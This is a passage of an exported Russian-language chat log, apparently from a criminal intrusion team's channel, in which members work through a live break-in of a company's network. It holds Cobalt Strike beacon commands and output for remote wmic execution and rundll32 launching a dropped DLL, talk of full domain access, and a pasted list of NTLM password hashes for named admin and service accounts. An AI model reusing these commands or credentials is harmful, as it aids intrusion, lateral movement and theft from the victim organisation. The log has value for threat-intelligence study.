+      "_id": "nSJ7uCXeyePkT2Z5q",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "хоть логи с кобы выкачивайте и там будут регулярные команды",
+      "ts": "2020-10-07T19:08:04.446Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:08:04.479Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2YRQsQWNsq7apga3q",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "записывайте, запоминайте",
+      "ts": "2020-10-07T19:07:45.033Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:07:45.061Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FX8bM7QpLyvij87is",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "меня это заебывает",
+      "ts": "2020-10-07T19:07:39.685Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:07:39.714Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bueHDdiKMWR498trz",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я не повторитель",
+      "ts": "2020-10-07T19:07:34.191Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:07:34.235Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TomaTkAMWpGPD5egg",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "уже не раз писал какая ошибка",
+      "ts": "2020-10-07T19:07:26.157Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:07:26.195Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ny66y2Rpgui8jCpvh",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "не говорю потому что уже разбирали",
+      "ts": "2020-10-07T19:07:19.618Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:07:19.645Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Qce3rZy9m373WBkqB",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell wmic /node:169.254.195.31 process call create \"ping google.com>C:\\Windows\\Temp\\SOOQA.txt\"\n[*] Tasked beacon to run: wmic /node:169.254.195.31 process call create \"ping google.com>C:\\Windows\\Temp\\SOOQA.txt\"\n[+] host called home, sent: 120 bytes\nbeacon> shell dir\n[*] Tasked beacon to run: dir\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 5764;\n\tReturnValue = 0;\n};\n\n\n[+] host called home, sent: 34 bytes\n[+] received output:\n Volume in drive C has no label.\n Volume Serial Number is 4C8B-2027\n\n Directory of C:\\ProgramData\n\n09/28/2020  01:22 PM    <DIR>          Applications\n10/05/2020  11:48 AM    <DIR>          Binary Fortress Software\n10/02/2020  03:52 PM            25,604 cn-matches.txt\n10/03/2020  04:18 PM             6,518 hostnames.txt\n10/02/2020  03:37 PM                 0 matches-share.txt\n10/02/2020  05:37 PM       818,088,516 matches_sysvol.rar\n09/23/2020  12:31 PM    <DIR>          Mozilla\n10/07/2020  09:03 PM               482 output.txt\n09/28/2020  02:11 PM    <DIR>          Package Cache\n10/03/2020  04:18 PM               511 ping.bat\n10/07/2020  07:01 PM    <DIR>          regid.1991-06.com.microsoft\n10/03/2020  08:19 PM            18,878 result.txt\n               7 File(s)    818,140,509 bytes\n               5 Dir(s)  168,773,058,560 bytes free\n\n```",
+      "ts": "2020-10-07T19:07:04.354Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:07:04.528Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aiefft3txm72QGppi",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ты говоришь время тикает нет сказать в чем конкретно ошибка хуйней страдаем",
+      "ts": "2020-10-07T19:06:58.836Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:06:58.857Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jYi7Z8Z7p5yoWqvEK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я не вижу что ты сделал",
+      "ts": "2020-10-07T19:06:58.717Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:06:58.759Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oCAaAHKRDfzTgtH7d",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "где команда вывод",
+      "ts": "2020-10-07T19:06:52.707Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:06:52.740Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DAYD3a4ytZvHTGNcC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "что не отработало",
+      "ts": "2020-10-07T19:06:49.311Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:06:49.349Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "D4speRRwQaBnPqv5a",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "нихуя",
+      "ts": "2020-10-07T19:06:42.905Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:06:42.992Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qqezxdicqB9nc5J9Y",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "не отработало",
+      "ts": "2020-10-07T19:06:34.240Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:06:34.265Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EousWt2qWkeKMH4Zc",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "что надо проверить",
+      "ts": "2020-10-07T19:05:16.631Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:05:16.673Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eraZALxQdaksMfyxN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "1+1",
+      "ts": "2020-10-07T19:05:09.077Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:05:09.101Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2WTAbmCRJ4HNCypFa",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "где проеб",
+      "ts": "2020-10-07T19:05:07.769Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:05:07.791Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Muc8uFYgrHdk9to9e",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "пинг во вмик не работает",
+      "ts": "2020-10-07T19:05:05.780Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:05:05.812Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GB22F97s9Zd33ogvP",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "у тебя пинг работает",
+      "ts": "2020-10-07T19:05:02.485Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:05:02.533Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pz9pLRzrdn7swoZPx",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "так блять подумай",
+      "ts": "2020-10-07T19:04:57.118Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:57.143Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hp6ES5ZHN7oiGpp2N",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "мне с саиглобал в дедик выводить?",
+      "ts": "2020-10-07T19:04:55.749Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:04:55.779Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JbKvJkzHsm3WH5xmS",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "да всмысле",
+      "ts": "2020-10-07T19:04:48.032Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:04:48.060Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZzhBGmqKAyDv3Ws4y",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я и не понял))))))",
+      "ts": "2020-10-07T19:04:33.567Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:33.595Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WWND7aFwiQCZBoy2i",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=fGGWwcFkJjfFHdZuE) а то скинул со вмиком",
+      "ts": "2020-10-07T19:04:30.621Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:30.647Z",
+      "attachments": [
+        {
+          "text": "```\nbeacon> shell wmic /node:10.225.10.200 process call create \"ping google.com>C:\\Windows\\Temp\\output.txt\"\n[*] Tasked beacon to run: wmic /node:10.225.10.200 process call create \"ping google.com>C:\\Windows\\Temp\\output.txt\"\n[+] host called home, sent: 120 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 3660;\n\tReturnValue = 0;\n};\n\n```",
+          "author_name": "user8",
+          "author_icon": "/avatar/user8",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=fGGWwcFkJjfFHdZuE",
+          "attachments": [],
+          "ts": "2020-10-07T18:57:32.064Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=fGGWwcFkJjfFHdZuE",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CztqZZX3iyseR2uET",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "чтож ты не сказал",
+      "ts": "2020-10-07T19:04:23.079Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:23.111Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ayLKXgtN8tG68xymW",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "и уже прям внутри делаешь пинг",
+      "ts": "2020-10-07T19:04:20.745Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:20.765Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BAXhd3fe5PXq4YDWj",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "так ты уже открыл доступ",
+      "ts": "2020-10-07T19:04:16.728Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:16.757Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9xhDQqjj466BRCa8F",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ааа",
+      "ts": "2020-10-07T19:04:13.485Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:04:13.525Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "a9tyYSKp2pWFWRHZK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell ping google.com > C:\\ProgramData\\output.txt\n[*] Tasked beacon to run: ping google.com > C:\\ProgramData\\output.txt\n[+] host called home, sent: 74 bytes\nbeacon> cd C:\\ProgramData\n[*] cd C:\\ProgramData\n[+] host called home, sent: 22 bytes\nbeacon> shell dir\n[*] Tasked beacon to run: dir\n[+] host called home, sent: 34 bytes\n[+] received output:\n Volume in drive C has no label.\n Volume Serial Number is 4C8B-2027\n\n Directory of C:\\ProgramData\n\n09/28/2020  01:22 PM    <DIR>          Applications\n10/05/2020  11:48 AM    <DIR>          Binary Fortress Software\n10/02/2020  03:52 PM            25,604 cn-matches.txt\n10/03/2020  04:18 PM             6,518 hostnames.txt\n10/02/2020  03:37 PM                 0 matches-share.txt\n10/02/2020  05:37 PM       818,088,516 matches_sysvol.rar\n09/23/2020  12:31 PM    <DIR>          Mozilla\n10/07/2020  09:03 PM               482 output.txt\n09/28/2020  02:11 PM    <DIR>          Package Cache\n10/03/2020  04:18 PM               511 ping.bat\n10/07/2020  07:01 PM    <DIR>          regid.1991-06.com.microsoft\n10/03/2020  08:19 PM            18,878 result.txt\n               7 File(s)    818,140,509 bytes\n               5 Dir(s)  168,773,152,768 bytes free\n\n\n```",
+      "ts": "2020-10-07T19:03:57.513Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:03:57.725Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rP5adD4oJTL8f7aiM",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "сразу команда - вывод",
+      "ts": "2020-10-07T19:03:44.111Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:03:44.152Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "29DDBwmrbkRT42BYW",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "отработала",
+      "ts": "2020-10-07T19:03:23.393Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:03:23.421Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qpC7xs7ge6Tr6f5Wv",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "так ребут был",
+      "ts": "2020-10-07T18:59:57.139Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:59:57.172Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8CS2kFJZXDXHN75t2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ща мне её заново соспавнят, она провисла на 19 часов",
+      "ts": "2020-10-07T18:59:37.806Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:59:37.881Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XQ4MFgL8oKh2EQG8R",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а на дедике такая команда отработает?",
+      "ts": "2020-10-07T18:58:14.572Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:58:14.607Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fGGWwcFkJjfFHdZuE",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell wmic /node:10.225.10.200 process call create \"ping google.com>C:\\Windows\\Temp\\output.txt\"\n[*] Tasked beacon to run: wmic /node:10.225.10.200 process call create \"ping google.com>C:\\Windows\\Temp\\output.txt\"\n[+] host called home, sent: 120 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 3660;\n\tReturnValue = 0;\n};\n\n```",
+      "ts": "2020-10-07T18:57:32.064Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:57:32.178Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "n8r6J3rEegdRG9aNY",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "скажи еще как пингуешь хосты оттуда)",
+      "ts": "2020-10-07T18:57:23.028Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:57:23.065Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eD4woSAQjbNGxKDqx",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "часики тикают",
+      "ts": "2020-10-07T18:57:05.606Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:57:05.650Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8k2QW3Z7X5XCGSiEJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "сюда не пускает иди дальше",
+      "ts": "2020-10-07T18:57:02.471Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:57:02.503Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2ThJzvPZbvHjGbhmN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "у тебя есть фул ад, хеши и прочее",
+      "ts": "2020-10-07T18:56:58.622Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:56:58.660Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "u28Sfxmtj3eQaJJTo",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "открой любой другой сервер",
+      "ts": "2020-10-07T18:56:50.665Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:56:50.705Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bCGEiAo2X2tf3oroo",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "datacenter.local",
+      "ts": "2020-10-07T18:56:18.108Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:56:18.141Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "e3GzqteYu94zzDrzu",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "какой домен?",
+      "ts": "2020-10-07T18:56:11.651Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:56:11.682Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WtWCJPWmg7u7FvEwP",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "файла на той машине нет",
+      "ts": "2020-10-07T18:55:56.681Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:55:56.725Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YoWrpek389hviQM5b",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "пытаюсь оттуда гугл пингануть с выводом в файл",
+      "ts": "2020-10-07T18:55:52.951Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:55:52.979Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jY5Gs7KKagJ5nGRGt",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "внешку видит?",
+      "ts": "2020-10-07T18:49:18.235Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T18:49:18.273Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZksZecDPj4PYnfxjK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "как быть?",
+      "ts": "2020-10-07T18:48:32.255Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:48:32.277Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZQbKp7BCBdGfZc4ud",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "закинул на 10.225.10.200 дэлку и запустил, выдало:\n```\nbeacon> shell wmic /node:10.225.10.200 process call create \"rundll32 C:\\Windows\\Temp\\x64.dll entryPoint\"\n[*] Tasked beacon to run: wmic /node:10.225.10.200 process call create \"rundll32 C:\\Windows\\Temp\\x64.dll entryPoint\"\n[+] host called home, sent: 121 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 964;\n\tReturnValue = 0;\n};\n``` \n\nДелка отработала и удалилась, но сессии нет, процесса на удалённой машине тоже",
+      "ts": "2020-10-07T18:47:38.006Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:47:38.128Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "N5Era69xb7gu9jFBf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T18:38:03.264Z",
+      "msg": "",
+      "file": {
+        "_id": "xZZeEAiGabYieZZai",
+        "name": "SaigProd.local.zip",
+        "type": "application/zip"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "SaigProd.local.zip",
+          "title_link": "/file-upload/xZZeEAiGabYieZZai/SaigProd.local.zip",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-07T18:38:03.302Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YCfCXEdbLtLdE63ze",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=pAQcZLTgxornyJwtC) @user4",
+      "ts": "2020-10-07T18:12:21.549Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T18:12:21.588Z",
+      "attachments": [
+        {
+          "text": "```\nsaiglobal.com\\adm.barsmr0 aad3b435b51404eeaad3b435b51404ee:fabb67c5be20e99698dbc77e751afb3f\nsaiglobal.com\\adm.brodan0 aad3b435b51404eeaad3b435b51404ee:06290576382001cd1da4c942e9fa0ca6\nsaig.frd.global\\adm.taydav1 aad3b435b51404eeaad3b435b51404ee:24aa312899f051fbc1a5b464de82c802\nsaiglobal.com\\adm.bisfra0 aad3b435b51404eeaad3b435b51404ee:6778ead5a63d0e8da0a2235147af85a0\nsaiglobal.com\\adm.brodav1 aad3b435b51404eeaad3b435b51404ee:4f1ef28113c7375b22d3f31bd294fa4e\nsaiglobal.com\\adm.evamar1 aad3b435b51404eeaad3b435b51404ee:65a8bca59e4205fc94ed31e11f78d4ac\nsaiglobal.com\\adm.kalnic0 aad3b435b51404eeaad3b435b51404ee:d9c4c5a3dca649913994767d6276b9f9\nsaiglobal.com\\adm.kinzac1 aad3b435b51404eeaad3b435b51404ee:52ab4557416b5fd8dfeed6e329db05fb\nsaiglobal.com\\adm.turime0 aad3b435b51404eeaad3b435b51404ee:2a0974987cad16892cf57c3f3646e1ea\nsaig.frd.global\\svc.sccmcliinst aad3b435b51404eeaad3b435b51404ee:aa9249f57aba289658fde8afe795fd67\nsaig.frd.global\\adm.taydav1 aad3b435b51404eeaad3b435b51404ee:24aa312899f051fbc1a5b464de82c802\nsaig.frd.global\\svc.msmap aad3b435b51404eeaad3b435b51404ee:c54366d3aa3826eea0441de8d24a97ee\nsaig.frd.global\\svc.sccmcliinst aad3b435b51404eeaad3b435b51404ee:aa9249f57aba289658fde8afe795fd67\nsaig.frd.global\\svc-apac-ems-search aad3b435b51404eeaad3b435b51404ee:3f42b326ea1826890f7bb977474083dc\n```",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=pAQcZLTgxornyJwtC",
+          "attachments": [],
+          "ts": "2020-10-05T20:44:30.320Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=pAQcZLTgxornyJwtC",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [
+        {
+          "_id": "hjejta5RxgeJ37xnE",
+          "username": "user4",
+          "name": "user4"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "D7A3pwXHPtCyupiPW",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "+",
+      "ts": "2020-10-07T17:59:37.215Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:59:37.243Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zvjAYMQhnh8MxBZpP",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "это мне",
+      "ts": "2020-10-07T17:59:13.928Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-07T17:59:13.965Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4HLgzWE8XuMJu3eLC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "или зачем сообщение выше?",
+      "ts": "2020-10-07T17:59:08.813Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:59:08.851Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YLRmytbwfjdGiRaAC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "saiglobal.com это их траст?",
+      "ts": "2020-10-07T17:58:58.994Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:58:59.036Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FzpQq5pdpvYKNefpf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=AqTqJRs2DTrERaaWP) 1",
+      "ts": "2020-10-07T17:58:18.949Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T17:58:18.975Z",
+      "attachments": [
+        {
